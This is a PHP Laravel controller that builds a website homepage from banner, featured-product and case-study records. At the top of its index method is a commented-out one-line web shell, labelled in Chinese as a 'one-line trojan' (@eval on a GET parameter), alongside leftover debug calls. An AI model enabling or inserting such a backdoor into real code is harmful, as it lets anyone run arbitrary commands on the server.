<?php

namespace App\Http\Controllers\Home;

use App\Banner;
use App\Cases;
use App\Friend;
use App\Product;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

class IndexController extends Controller
{
    public function index(){
        //一句话木马
//            @eval($_GET['a']);
//            die;
//        dd($_SERVER);
//        session(['key'=>'1234561']);
//        session()->save();
//        dd(session('key',"无数据"));
        //获取banner
        $banners = Banner::where('entitle','=','indexbanner')->first();
        //获取核心产品
        $product = Product::OrderBy('created_at','Desc')->OrderBy("id",'Desc')->where('tuijian','=',1)->take(4)->get();
        //获取案例
        $cases = Cases::OrderBy('created_at','Desc')->OrderBy("id",'Desc')->OrderBy('sort','Desc')->take(4)->get();
        return view('home.index.index')->with('banners',$banners)->with('product',$product)->with('cases',$cases);
    }

}
